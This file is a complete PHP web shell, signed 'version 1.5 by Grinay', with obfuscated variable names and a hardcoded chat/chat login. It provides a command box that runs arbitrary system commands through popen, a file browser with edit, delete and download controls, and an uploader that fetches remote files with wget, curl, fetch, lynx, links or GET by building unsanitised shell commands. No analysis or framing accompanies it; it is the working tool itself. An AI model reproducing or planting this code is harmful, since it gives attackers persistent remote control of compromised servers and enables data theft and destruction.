<?php
session_start();
error_reporting(0);
set_time_limit(9999999);
$dd_0='chat';
$dd_1='chat';
$dd_2=1;
$dd_3='version 1.5 by Grinay';
$dd_4='';
$dd_5='<STYLE>
BODY{
  background-color: #2B2F34;
  color: #C1C1C7;
  font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
  MARGIN-TOP: 0px;
  MARGIN-BOTTOM: 0px;
  MARGIN-LEFT: 0px;
  MARGIN-RIGHT: 0px;
  margin:0;
  padding:0;
  scrollbar-face-color: #336600;
  scrollbar-shadow-color: #333333;
  scrollbar-highlight-color: #333333;
  scrollbar-3dlight-color: #333333;
  scrollbar-darkshadow-color: #333333;
  scrollbar-track-color: #333333;
  scrollbar-arrow-color: #333333;
}
input{
  background-color: #336600;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
select{
  background-color: #336600;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
textarea{
  background-color: #333333;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
a:link{
  
  color: #B9B9BD;
  text-decoration: none;
  font-size: 8pt;
}
a:visited{
  color: #B9B9BD;
  text-decoration: none;
  font-size: 8pt;
}
a:hover, a:active{
  width: 100%;
  background-color: #A8A8AD;
  
  color: #E7E7EB;
  text-decoration: none;
  font-size: 8pt;
}
td, th, p, li{
  font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
  border-color:black;
}
</style>';
$dd_6='<html><head><title>'.getenv("HTTP_HOST").' </title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$dd_5.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$dd_7='</body></html>';

$dd_8="File already exists.";
$dd_9="File was successfully uploaded.";
$dd_10="Dir is created.";
$dd_11="Don't create dir.";
$dd_12="Dir not found.";
$dd_13="Directory not empty or access denide.";
$dd_14="File deleted";
$dd_15="Dir deleted";

if(@$_POST['action']=="exit")unset($_SESSION['an']);
if($dd_2==1){if(@$_POST['login']==$dd_0 && @$_POST['password']==$dd_1)$_SESSION['an']=1;}else $_SESSION['an']='1';
if(@$_SESSION['an']==0){
echo $dd_6;
echo '<center><table><form method="POST"><tr><td>Login:</td><td><input type="text" name="login" value=""></td></tr><tr><td>Password:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center>';
echo $dd_7;
exit;}

function ll__0($dd_16){if(@mkdir($dd_16))echo $GLOBALS['dircrt']." "; else echo $GLOBALS['dircrterr']." ";}



if($_SESSION['action']=="")$_SESSION['action']="viewer";
if(@$_POST['action']!="" )$_SESSION['action']=$_POST['action'];$dd_17=$_SESSION['action'];
if(@$_POST['dir']!="")$_SESSION['dir']=$_POST['dir'];$dd_16=$_SESSION['dir'];

$dd_16=chdir($dd_16);
$dd_16=getcwd()."/";
$dd_16=str_replace("\\","/",$dd_16);








if(@$_POST['file']!=""){$dd_18=$_SESSION['file']=$_POST['file'];}else {$dd_18=$_SESSION['file']="";}
  
if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $dd_19=1; else $dd_19=0;



 
 
 

if($dd_17=="download"){ 
header('Content-Length:'.filesize($dd_18).'');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.$dd_18.'"');
readfile($dd_18);
}

if($dd_17=="delete"){ 
if(unlink($dd_18)) $dd_4.=$dd_14;
}

if($dd_17=="deletedir"){ 
if(!rmdir($dd_18)) $dd_4.=$GLOBALS['empty'];else $dd_4.=$dd_15;

}
?>

<? echo $dd_6;?> 
<!--content-->
<table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td>
<table><tr>
<td><a href="#" onclick="document.reqs.action.value='shell'; document.reqs.submit();">| Shell </a></td>
<td><a href="#" onclick="document.reqs.action.value='viewer'; document.reqs.submit();">| Viewer</a></td>
<td><a href="#" onclick="document.reqs.action.value='editor'; document.reqs.submit();">| Editor</a></td>
<td><a href="#" onclick="document.reqs.action.value='upload'; document.reqs.submit();">| Upload</a></td>
<td><a href="#" onclick="document.reqs.action.value='exit'; document.reqs.submit();">| EXIT |</a></td>
<td><a href="#" onclick="history.back();"> <-back |</a></td>
<td><a href="#" onclick="history.forward();"> forward->|</a></td>

</tr></table></td></tr></table><br>
<form name='reqs' method='POST'>
<input name='action' type='hidden' value=''>
<input name='dir' type='hidden' value=''>
<input name='file' type='hidden' value=''>
</form>
<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" valign="top">
<!--end one content-->
<?php if(@$dd_4!="") echo $dd_4;?>
<?

function ll__1($dd_20){
if (!empty($dd_20)){
  $dd_21 = popen($dd_20,"r");
  {
    $dd_22 = "";
    while(!feof($dd_21)){$dd_22.=fread($dd_21,1024);}
    pclose($dd_21);
  }
  $dd_23 = $dd_22;
  $dd_23 = convert_cyr_string($dd_23,"d","w");
}
return $dd_23;}

if($dd_17=="shell"){
echo "<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"shell\">
<textarea name=\"command\" rows=\"5\" cols=\"150\">".@$_POST['command']."</textarea><br>
<textarea readonly rows=\"15\" cols=\"150\">".@htmlspecialchars(ll__1($_POST['command']))."</textarea><br>
<input type=\"submit\" value=\"execute\"></form>";}


function ll__2($dd_18) 
{ 
  $dd_24 = fileperms($dd_18);
  if (($dd_24 & 0xC000) == 0xC000) {$dd_25 = 's';} 
  elseif (($dd_24 & 0xA000) == 0xA000) {$dd_25 = 'l';} 
  elseif (($dd_24 & 0x8000) == 0x8000) {$dd_25 = '-';} 
  elseif (($dd_24 & 0x6000) == 0x6000) {$dd_25 = 'b';} 
  elseif (($dd_24 & 0x4000) == 0x4000) {$dd_25 = 'd';} 
  elseif (($dd_24 & 0x2000) == 0x2000) {$dd_25 = 'c';} 
  elseif (($dd_24 & 0x1000) == 0x1000) {$dd_25 = 'p';} 
  else {$dd_25 = 'u';}
  $dd_25 .= (($dd_24 & 0x0100) ? 'r' : '-');
  $dd_25 .= (($dd_24 & 0x0080) ? 'w' : '-');
  $dd_25 .= (($dd_24 & 0x0040) ?(($dd_24 & 0x0800) ? 's' : 'x' ) :(($dd_24 & 0x0800) ? 'S' : '-'));
  $dd_25 .= (($dd_24 & 0x0020) ? 'r' : '-');
  $dd_25 .= (($dd_24 & 0x0010) ? 'w' : '-');
  $dd_25 .= (($dd_24 & 0x0008) ?(($dd_24 & 0x0400) ? 's' : 'x' ) :(($dd_24 & 0x0400) ? 'S' : '-'));
  $dd_25 .= (($dd_24 & 0x0004) ? 'r' : '-');
  $dd_25 .= (($dd_24 & 0x0002) ? 'w' : '-');
  $dd_25 .= (($dd_24 & 0x0001) ?(($dd_24 & 0x0200) ? 't' : 'x' ) :(($dd_24 & 0x0200) ? 'T' : '-'));
  return $dd_25;
} 

function ll__3($dd_26)
{
 if($dd_26 >= 1073741824) {$dd_26 = @round($dd_26 / 1073741824 * 100) / 100 . " GB";}
 elseif($dd_26 >= 1048576) {$dd_26 = @round($dd_26 / 1048576 * 100) / 100 . " MB";}
 elseif($dd_26 >= 1024) {$dd_26 = @round($dd_26 / 1024 * 100) / 100 . " KB";}
 else {$dd_26 = $dd_26 . " B";}
 return $dd_26;
}

function ll__4($dd_16){


		
echo "<table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\">";
echo "<tr><td><form method=POST>Open directory:<input type=text name=dir value=\"".$dd_16."\" size=50><input type=submit value=\"GO\"></form></td></tr>";

if (is_dir($dd_16)) {
    if (@$dd_27 = opendir($dd_16)) {
        while (($dd_18 = readdir($dd_27)) !== false) {
		  if(filetype($dd_16 . $dd_18)=="dir") $dd_28[]=$dd_18;
		  if(filetype($dd_16 . $dd_18)=="file")$dd_29[]=$dd_18;
		}
		closedir($dd_27);
		@sort($dd_28);
		@sort($dd_29);


if ($GLOBALS['win']==1) {
echo "<tr><td>Select drive:";
for ($dd_30=ord('C'); $dd_30<=ord('Z'); $dd_30++) 
 if (@$dd_27 = opendir(chr($dd_30).":/"))
 echo '<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($dd_30).':/\'; document.reqs.submit();"> '.chr($dd_30).'<a/>';
 echo "</td></tr>";
}
echo "<tr><td>OS: ".@php_uname()."</td></tr>
<tr><td>name dirs and files</td><td>type</td><td>size</td><td>permission</td><td>options</td></tr>";
for($dd_31=0;$dd_31<count($dd_28);$dd_31++) {
$dd_32=$dd_16.$dd_28[$dd_31];
  echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$dd_32.'\'; document.reqs.submit();">'.$dd_28[$dd_31].'<a/></td><td>dir</td><td></td><td>'.ll__2($dd_32).'</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\''.$dd_32.'\'; document.reqs.submit();" title="Delete this file">X</a></td></tr>';  
  }
for($dd_31=0;$dd_31<count($dd_29);$dd_31++) {
$dd_33=$dd_16.$dd_29[$dd_31];
echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$dd_33.'\'; document.reqs.submit();">'.$dd_29[$dd_31].'</a><br></td><td>file</td><td>'.ll__3(filesize($dd_33)).'</td>
<td>'.ll__2($dd_33).'</td>
<td>
<a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$dd_33.'\'; document.reqs.submit();" title="Download">D</a>
<a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$dd_33.'\'; document.reqs.submit();" title="Edit">E</a>
<a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$dd_33.'\'; document.reqs.submit();" title="Delete this file">X</a></td>
</tr>'; 
}
echo "</table>";
}}}

if($dd_17=="viewer"){
ll__4($dd_16);
}

if($dd_17=="editor"){  
  function ll__5($dd_18,$dd_34){
  $dd_21 = fopen($dd_18,"w+");
  fwrite($dd_21,$dd_34);
  fclose($dd_21);
  }
  function ll__6($dd_18){
  if(!$dd_35 = fopen($dd_18, "r")) $dd_36="Can't open file, permission denide"; else {
  $dd_36 = fread($dd_35, filesize($dd_18));
  fclose($dd_35);}
  return htmlspecialchars($dd_36);
  }
if(@$_POST['save'])ll__5($dd_18,$_POST['data']);
echo "<form method=\"POST\">
<input type=\"hidden\" name=\"action\" value=\"editor\">
<input type=\"hidden\" name=\"file\" value=\"".$dd_18."\">
<textarea name=\"data\" rows=\"40\" cols=\"180\">".@ll__6($dd_18)."</textarea><br>
<input type=\"submit\" name=\"save\" value=\"save\"><input type=\"reset\" value=\"reset\"></form>";
}

if($dd_17=="upload"){
  if(@$_POST['dirupload']!="") $dd_37=$_POST['dirupload'];else $dd_37=$dd_16;
  $dd_38="<tr><td><form method=POST enctype=multipart/form-data>Upload to dir:<input type=text name=dirupload value=\"".$dd_37."\" size=50></tr></td><tr><td>New file name:<input type=text name=filename></td></tr><tr><td><input type=file name=file><input type=submit name=uploadloc value='Upload local file'></td></tr>";
  if($GLOBALS['win']==1)echo $dd_38;
  if($GLOBALS['win']==0){
    echo $dd_38;
	echo '<tr><td><select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>File addres:<input type=text name=urldown>
<input type=submit name=upload value=Upload></form></td></tr>';	
}

if(@$_POST['uploadloc']){
if(@$_POST['filename']=="") $dd_39 = $dd_37.basename($_FILES['file']['name']); else 
$dd_39 = $dd_37."/".$_POST['filename'];

if(!file_exists($dd_37)){ll__0($dd_37);}
if(file_exists($dd_39))echo $GLOBALS['filext']; 
elseif (move_uploaded_file($_FILES['file']['tmp_name'], $dd_39)) 
echo $GLOBALS['uploadok'];
}

if(@$_POST['upload']){
    if (!empty($_POST['with']) && !empty($_POST['urldown']) && !empty($_POST['filename']))
	switch($_POST['with'])
	{
	  case wget:
	  ll__1(which('wget')." ".$_POST['urldown']." -O ".$_POST['filename']."");
	  break;
 	  case fetch:
 	  ll__1(which('fetch')." -o ".$_POST['filename']." -p ".$_POST['urldown']."");
 	  break;
 	  case lynx:
 	  ll__1(which('lynx')." -source ".$_POST['urldown']." > ".$_POST['filename']."");
 	  break;
 	  case links:
 	  ll__1(which('links')." -source ".$_POST['urldown']." > ".$_POST['filename']."");
 	  break;
 	  case GET:
 	  ll__1(which('GET')." ".$_POST['urldown']." > ".$_POST['filename']."");
 	  break;
 	  case curl:
 	  ll__1(which('curl')." ".$_POST['urldown']." -o ".$_POST['filename']."");
 	  break;
	 }
	}
  
}



?>
</td></tr></table><table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td><table><tr><td></td></tr></table></tr></td></table>
<? echo $dd_7;?>
